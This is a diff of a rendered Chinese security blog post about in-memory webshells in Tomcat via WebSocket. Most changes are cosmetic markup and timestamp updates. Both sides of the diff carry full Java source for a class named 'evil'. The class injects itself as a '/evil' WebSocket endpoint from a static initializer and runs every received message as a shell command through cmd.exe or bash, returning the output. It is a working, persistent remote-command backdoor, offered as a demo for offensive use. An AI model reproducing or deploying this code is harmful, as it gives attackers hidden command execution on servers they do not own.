@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.110.0"><meta name="theme-color" content="#fff" />
     <meta name="color-scheme" content="light dark">
 
     
@@ -21,7 +21,7 @@
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.d82c753d66fbef2856c2724a5780616edad8aec63de7b22ad9f0da04399cf246.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.1a7822cfcef5444fb929909731e9fd1bdfdbe1d6148f6085416ab3527d76d403.js"></script>
 
     
 
@@ -57,7 +57,7 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2022-07-19T00:58:30+08:00",
-        "dateModified": "2022-10-30T10:47:31+08:00",
+        "dateModified": "2022-10-30T10:47:32+08:00",
         "url": "https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/",
         "headline": "Tomcat WebSocket内存马原理浅析",
         "description": "本文首发跳跳糖：《Tomcat WebSocket内存马原理浅析》 周末和N1k0la师傅看到了这个repo：wsMemShell，决定来研究一番。 正好某大行动要开始了，希望此文能抛砖引玉，给师傅们带来一……",
@@ -107,7 +107,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202207191826978.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2022-07-19T00:58:30&#43;08:00" />
-    <meta property="article:modified_time" content="2022-10-30T10:47:31&#43;08:00" />
+    <meta property="article:modified_time" content="2022-10-30T10:47:32&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -243,7 +243,7 @@
     
     
         
-        <time datetime="2022-10-30T10:47:31&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
+        <time datetime="2022-10-30T10:47:32&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
     
     
     
@@ -329,8 +329,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nd">@ServerEndpoint</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;/ws/{userId}&#34;</span><span class="o">,</span> <span class="n">encoders</span> <span class="o">=</span> <span class="o">{</span><span class="n">MessageEncoder</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">decoders</span> <span class="o">=</span> <span class="o">{</span><span class="n">MessageDecoder</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">configurator</span> <span class="o">=</span> <span class="n">MyServerConfigurator</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ServerEndpoint</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;/ws/{userId}&#34;</span><span class="o">,</span> <span class="n">encoders</span> <span class="o">=</span> <span class="o">{</span><span class="n">MessageEncoder</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">decoders</span> <span class="o">=</span> <span class="o">{</span><span class="n">MessageDecoder</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">configurator</span> <span class="o">=</span> <span class="n">MyServerConfigurator</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：</p>
 <ul>
@@ -349,8 +349,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">ServerEndpointConfig</span> <span class="n">serverEndpointConfig</span> <span class="o">=</span> <span class="n">ServerEndpointConfig</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">WebSocketServerEndpoint3</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;/ws/{userId}&#34;</span><span class="o">).</span><span class="na">decoders</span><span class="o">(</span><span class="n">decoderList</span><span class="o">).</span><span class="na">encoders</span><span class="o">(</span><span class="n">encoderList</span><span class="o">).</span><span class="na">configurator</span><span class="o">(</span><span class="k">new</span> <span class="n">MyServerConfigurator</span><span class="o">()).</span><span class="na">build</span><span class="o">();</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServerEndpointConfig</span> <span class="n">serverEndpointConfig</span> <span class="o">=</span> <span class="n">ServerEndpointConfig</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">WebSocketServerEndpoint3</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;/ws/{userId}&#34;</span><span class="o">).</span><span class="na">decoders</span><span class="o">(</span><span class="n">decoderList</span><span class="o">).</span><span class="na">encoders</span><span class="o">(</span><span class="n">encoderList</span><span class="o">).</span><span class="na">configurator</span><span class="o">(</span><span class="k">new</span> <span class="n">MyServerConfigurator</span><span class="o">()).</span><span class="na">build</span><span class="o">();</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="tomcat-websocket的加载"><a href="#tomcat-websocket的加载" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:tomcat-websocket的加载" class="headings">Tomcat WebSocket的加载</a></h2>
 <p>Tomcat提供了一个<code>javax.servlet.ServletContainerInitializer</code>的实现类<code>org.apache.tomcat.websocket.server.WsSci</code>。</p>
@@ -392,10 +392,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">ServerContainer</span> <span class="n">container</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerContainer</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ServerContainer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
-<span class="n">ServerEndpointConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="n">ServerEndpointConfig</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">evil</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;/ws&#34;</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
-<span class="n">container</span><span class="o">.</span><span class="na">addEndpoint</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ServerContainer</span> <span class="n">container</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerContainer</span><span class="o">)</span> <span class="n">req</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ServerContainer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="n">ServerEndpointConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="n">ServerEndpointConfig</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">evil</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;/ws&#34;</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">container</span><span class="o">.</span><span class="na">addEndpoint</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="demo"><a href="#demo" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:demo" class="headings">demo</a></h3>
 <p>将注入内存马的操作放在static块，加载这个类即可实现内存马注入</p>
@@ -461,64 +461,64 @@
 </span><span class="lnt">57
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">org.apache.catalina.core.StandardContext</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.apache.catalina.loader.WebappClassLoaderBase</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">org.apache.tomcat.websocket.server.WsServerContainer</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">javax.websocket.*</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.websocket.server.ServerContainer</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.websocket.server.ServerEndpointConfig</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">evil</span> <span class="kd">extends</span> <span class="n">Endpoint</span> <span class="kd">implements</span> <span class="n">MessageHandler</span><span class="o">.</span><span class="na">Whole</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="o">{</span>
-    <span class="kd">static</span> <span class="o">{</span>
-        <span class="n">WebappClassLoaderBase</span> <span class="n">webappClassLoaderBase</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebappClassLoaderBase</span><span class="o">)</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
-        <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">webappClassLoaderBase</span><span class="o">.</span><span class="na">getResources</span><span class="o">().</span><span class="na">getContext</span><span class="o">();</span>
-        <span class="n">ServerEndpointConfig</span> <span class="n">build</span> <span class="o">=</span> <span class="n">ServerEndpointConfig</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">evil</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;/evil&#34;</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
-        <span class="n">WsServerContainer</span> <span class="n">attribute</span> <span class="o">=</span> <span class="o">(</span><span class="n">WsServerContainer</span><span class="o">)</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ServerContainer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">attribute</span><span class="o">.</span><span class="na">addEndpoint</span><span class="o">(</span><span class="n">build</span><span class="o">);</span>
-            <span class="c1">// System.out.println(&#34;ok!&#34;);
-</span><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">DeploymentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    <span class="kd">private</span> <span class="n">Session</span> <span class="n">session</span><span class="o">;</span>
-
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onMessage</span><span class="o">(</span><span class="n">String</span> <span class="n">message</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="kt">boolean</span> <span class="n">iswin</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;windows&#34;</span><span class="o">);</span>
-            <span class="n">Process</span> <span class="n">exec</span><span class="o">;</span>
-            <span class="k">if</span> <span class="o">(</span><span class="n">iswin</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">exec</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">message</span><span class="o">});</span>
-            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-                <span class="n">exec</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">message</span><span class="o">});</span>
-            <span class="o">}</span>
-
-            <span class="n">InputStream</span> <span class="n">ips</span> <span class="o">=</span> <span class="n">exec</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
-            <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
-
-            <span class="kt">int</span> <span class="n">i</span><span class="o">;</span>
-            <span class="k">while</span><span class="o">((</span><span class="n">i</span> <span class="o">=</span> <span class="n">ips</span><span class="o">.</span><span class="na">read</span><span class="o">())</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">{</span>
-                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">i</span><span class="o">);</span>
-            <span class="o">}</span>
-
-            <span class="n">ips</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-            <span class="n">exec</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
-            <span class="k">this</span><span class="o">.</span><span class="na">session</span><span class="o">.</span><span class="na">getBasicRemote</span><span class="o">().</span><span class="na">sendText</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onOpen</span><span class="o">(</span><span class="n">Session</span> <span class="n">session</span><span class="o">,</span> <span class="n">EndpointConfig</span> <span class="n">config</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">this</span><span class="o">.</span><span class="na">session</span> <span class="o">=</span> <span class="n">session</span><span class="o">;</span>
-        <span class="k">this</span><span class="o">.</span><span class="na">session</span><span class="o">.</span><span class="na">addMessageHandler</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.catalina.core.StandardContext</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.catalina.loader.WebappClassLoaderBase</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.tomcat.websocket.server.WsServerContainer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.websocket.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.websocket.server.ServerContainer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.websocket.server.ServerEndpointConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">evil</span> <span class="kd">extends</span> <span class="n">Endpoint</span> <span class="kd">implements</span> <span class="n">MessageHandler</span><span class="o">.</span><span class="na">Whole</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WebappClassLoaderBase</span> <span class="n">webappClassLoaderBase</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebappClassLoaderBase</span><span class="o">)</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span> <span class="n">webappClassLoaderBase</span><span class="o">.</span><span class="na">getResources</span><span class="o">().</span><span class="na">getContext</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ServerEndpointConfig</span> <span class="n">build</span> <span class="o">=</span> <span class="n">ServerEndpointConfig</span><span class="o">.</span><span class="na">Builder</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">evil</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="s">&#34;/evil&#34;</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WsServerContainer</span> <span class="n">attribute</span> <span class="o">=</span> <span class="o">(</span><span class="n">WsServerContainer</span><span class="o">)</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ServerContainer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">attribute</span><span class="o">.</span><span class="na">addEndpoint</span><span class="o">(</span><span class="n">build</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// System.out.println(&#34;ok!&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">DeploymentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Session</span> <span class="n">session</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onMessage</span><span class="o">(</span><span class="n">String</span> <span class="n">message</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">boolean</span> <span class="n">iswin</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;windows&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Process</span> <span class="n">exec</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">iswin</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exec</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">message</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">exec</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">message</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">InputStream</span> <span class="n">ips</span> <span class="o">=</span> <span class="n">exec</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">i</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span><span class="o">((</span><span class="n">i</span> <span class="o">=</span> <span class="n">ips</span><span class="o">.</span><span class="na">read</span><span class="o">())</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">((</span><span class="kt">char</span><span class="o">)</span><span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">ips</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exec</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">session</span><span class="o">.</span><span class="na">getBasicRemote</span><span class="o">().</span><span class="na">sendText</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onOpen</span><span class="o">(</span><span class="n">Session</span> <span class="n">session</span><span class="o">,</span> <span class="n">EndpointConfig</span> <span class="n">config</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">session</span> <span class="o">=</span> <span class="n">session</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">session</span><span class="o">.</span><span class="na">addMessageHandler</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>效果：</p>
 <p><img src="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202207191826978.png" alt=""></p>
@@ -561,38 +561,38 @@
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
